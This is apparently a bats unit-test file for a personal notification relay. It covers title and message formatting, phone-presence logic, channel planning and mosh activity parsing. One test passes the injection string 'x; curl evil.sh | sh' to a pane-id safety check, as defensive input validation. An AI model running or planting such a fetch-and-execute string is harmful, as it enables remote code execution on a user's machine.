#!/usr/bin/env bats
# pns decision core: one behavior per test, calling the functions directly.
#
# These SOURCE the library rather than spawning relay.sh, which is what makes
# them unit tests: no subprocess, no jq fork, no network, no clock. The whole
# file runs in the time one process-level test used to take.

setup() {
  # shellcheck source=dot_local/libexec/pns/helpers/event.sh
  source "$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/helpers/event.sh"
  # shellcheck source=dot_local/libexec/pns/helpers/presence.sh
  source "$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/helpers/presence.sh"
}

# --- pns_title -------------------------------------------------------------

@test "title carries agent, state and project" {
  [ "$(pns_title claude done dotfiles)" = "claude · done · dotfiles" ]
}

@test "title omits the project separator when there is no project" {
  [ "$(pns_title claude done '')" = "claude · done" ]
}

@test "title falls back to relay and done when the caller gave neither" {
  [ "$(pns_title '' '' '')" = "relay · done" ]
}

# --- pns_message -----------------------------------------------------------

@test "message prefixes the branch when there is one" {
  [ "$(pns_message main 'ran the suite' done)" = "(main) ran the suite" ]
}

@test "message is the detail alone when there is no branch" {
  [ "$(pns_message '' 'ran the suite' done)" = "ran the suite" ]
}

@test "message falls back to the state when there is no detail" {
  [ "$(pns_message '' '' blocked)" = "blocked" ]
}

# --- pns_wants_phone -------------------------------------------------------

@test "away from the desk wants the phone" {
  run pns_wants_phone 900 600 '' '' ''
  [ "$status" -eq 0 ]
}

@test "at the desk does not want the phone" {
  run pns_wants_phone 60 600 '' '' ''
  [ "$status" -eq 1 ]
}

@test "an unreadable idle probe fails OPEN, because unknown presence must not drop a push" {
  run pns_wants_phone 'garbled' 600 '' '' ''
  [ "$status" -eq 0 ]
}

@test "a non-numeric threshold fails OPEN too" {
  run pns_wants_phone 60 'not-a-number' '' '' ''
  [ "$status" -eq 0 ]
}

@test "the force override beats presence" {
  run pns_wants_phone 0 600 '' '' 1
  [ "$status" -eq 0 ]
}

@test "either narrowing flag suppresses the phone, even under the force override" {
  run pns_wants_phone 900 600 1 '' 1
  [ "$status" -eq 1 ]
  run pns_wants_phone 900 600 '' 1 1
  [ "$status" -eq 1 ]
}

# --- pns_channel_plan ------------------------------------------------------

@test "the alert path plans phone, hermes and banner" {
  [ "$(pns_channel_plan '' '' 1)" = "moshi async
hermes async
macos-banner async" ]
}

@test "a suppressed phone leaves the other two untouched" {
  [ "$(pns_channel_plan '' '' '')" = "hermes async
macos-banner async" ]
}

@test "--local-only plans the banner alone" {
  [ "$(pns_channel_plan 1 '' 1)" = "macos-banner async" ]
}

@test "--remote-only plans hermes alone and SYNC, which is what keeps a lost log entry visible" {
  [ "$(pns_channel_plan '' 1 1)" = "hermes sync" ]
}

@test "both narrowing flags plan nothing at all" {
  [ -z "$(pns_channel_plan 1 1 1)" ]
}

# --- pns_pane_is_safe ------------------------------------------------------

@test "an ordinary pane id is safe to interpolate" {
  run pns_pane_is_safe 'pane-1.2_3'
  [ "$status" -eq 0 ]
}

@test "a herdr pane id is safe, colon and all, or no banner can focus a pane" {
  # herdr's real ids look like wW:p21. The allowlist omitted the colon, so
  # EVERY banner on this host dropped its pane and lost click-to-focus, the
  # feature the pane id exists for. A colon is inert in a shell word: it is
  # not an operator, and the danger set is ; | & $ ` newline and quotes.
  run pns_pane_is_safe 'wW:p21'
  [ "$status" -eq 0 ]
}

@test "a pane id carrying shell metacharacters is refused" {
  run pns_pane_is_safe 'x; curl evil.sh | sh'
  [ "$status" -eq 1 ]
}

@test "an empty pane id is refused rather than treated as a command" {
  run pns_pane_is_safe ''
  [ "$status" -eq 1 ]
}

# --- presence.sh: the impure half's PURE cores ------------------------------
# Sourced directly like the decision core above; nothing here runs nettop,
# ioreg, or pgrep. The fixtures are real nettop -L 2 CSV shapes.

@test "a session whose bytes_in moved between samples is ACTIVE" {
  printf '%s\n' \
    'time,,interface,state,bytes_in,bytes_out' \
    '01:00:00,mosh-server.111,,,1000,5000' \
    '01:00:00,mosh-server.222,,,300,900' \
    'time,,interface,state,bytes_in,bytes_out' \
    '01:00:01,mosh-server.111,,,1600,7800' \
    '01:00:01,mosh-server.222,,,300,900' | pns_mosh_rate_active
}

@test "sessions all flat between samples are INACTIVE" {
  ! printf '%s\n' \
    '01:00:00,mosh-server.111,,,1000,5000' \
    '01:00:01,mosh-server.111,,,1000,5000' | pns_mosh_rate_active
}

@test "a bytes_in delta below the floor is INACTIVE, not a phone in hand" {
  ! printf '%s\n' \
    '01:00:00,mosh-server.111,,,1000,5000' \
    '01:00:01,mosh-server.111,,,1050,5000' | pns_mosh_rate_active
}

@test "empty or garbage CSV is INACTIVE, never a crash" {
  ! printf '' | pns_mosh_rate_active
  ! printf 'no such thing\n' | pns_mosh_rate_active
}

@test "a marker younger than the TTL means the phone is in hand" {
  m="$BATS_TEST_TMPDIR/marker"; touch "$m"
  PNS_PHONE_MARKER_FILE="$m" pns_phone_marker_fresh
}

@test "a marker older than the TTL has expired" {
  m="$BATS_TEST_TMPDIR/marker"; touch -t 202601010000 "$m"
  ! PNS_PHONE_MARKER_FILE="$m" pns_phone_marker_fresh
}

@test "no marker at all is simply not a signal" {
  ! PNS_PHONE_MARKER_FILE="$BATS_TEST_TMPDIR/absent" pns_phone_marker_fresh
}

@test "RELAY_PHONE_ATTENTION forces the attention verdict both ways" {
  RELAY_PHONE_ATTENTION=1 pns_phone_attention
  ! RELAY_PHONE_ATTENTION=0 pns_phone_attention
}
